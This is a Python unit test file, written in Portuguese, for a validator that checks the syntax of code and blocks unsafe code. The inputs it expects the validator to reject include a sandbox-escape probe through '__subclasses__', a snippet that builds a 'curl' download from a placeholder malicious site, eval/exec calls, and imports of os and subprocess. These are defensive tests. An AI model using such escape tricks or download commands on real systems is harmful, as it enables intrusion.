import os
import sys
import unittest

raiz_projeto = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
src_path = os.path.join(raiz_projeto, "src")
if raiz_projeto not in sys.path:
    sys.path.insert(0, raiz_projeto)
if src_path not in sys.path:
    sys.path.insert(0, src_path)

from iaglobal.validation.syntax import codigo_python_valido
from iaglobal.validation.ast_security import inspecionar_seguranca_codigo, _checker


class TestValidationSystem(unittest.TestCase):

    def test_sintaxe_python_valida(self):
        codigo_bom = "def inverter(s):\n    return s[::-1]"
        self.assertTrue(codigo_python_valido(codigo_bom))

    def test_sintaxe_python_invalida(self):
        codigo_quebrado = "def inverter(s)\n    return s["
        self.assertFalse(codigo_python_valido(codigo_quebrado))

    def test_bloqueio_importacao_proibida_direta(self):
        codigo_proibido = "import os\ndef test(): pass"
        self.assertFalse(inspecionar_seguranca_codigo(codigo_proibido))

    def test_bloqueio_importacao_proibida_from(self):
        codigo_proibido = "from subprocess import Popen\ndef run(): pass"
        self.assertFalse(inspecionar_seguranca_codigo(codigo_proibido))

    def test_bloqueio_funcoes_dinamicas_perigosas(self):
        self.assertFalse(inspecionar_seguranca_codigo("eval('1 + 1')"))
        self.assertFalse(inspecionar_seguranca_codigo("exec('import os')"))

    def test_bloqueio_evasao_por_ofuscacao_de_atributo(self):
        codigo_ofuscado = """
[].__class__.__base__.__subclasses__()
"""
        seguro, violacoes = _checker.verificar_codigo(codigo_ofuscado)
        self.assertFalse(seguro)
        self.assertTrue(any("__subclasses__" in v for v in violacoes))

    def test_bloqueio_evasao_por_strings_literais_suspeitas(self):
        codigo_suspeito = """
def baixar_arquivo():
    url = "https://malicious-site.com"
    comando = "curl -O " + url
    return comando
"""
        self.assertFalse(inspecionar_seguranca_codigo(codigo_suspeito))

    def test_aceitacao_codigo_seguro_e_limpo(self):
        codigo_seguro = """
def calcular_fatorial(n):
    if n < 0:
        raise ValueError("Apenas números inteiros positivos.")
    if n in (0, 1):
        return 1
    return n * calcular_fatorial(n - 1)
"""
        seguro, violacoes = _checker.verificar_codigo(codigo_seguro)
        self.assertTrue(seguro, f"Falso positivo detectado: {violacoes}")


if __name__ == "__main__":
    unittest.main()
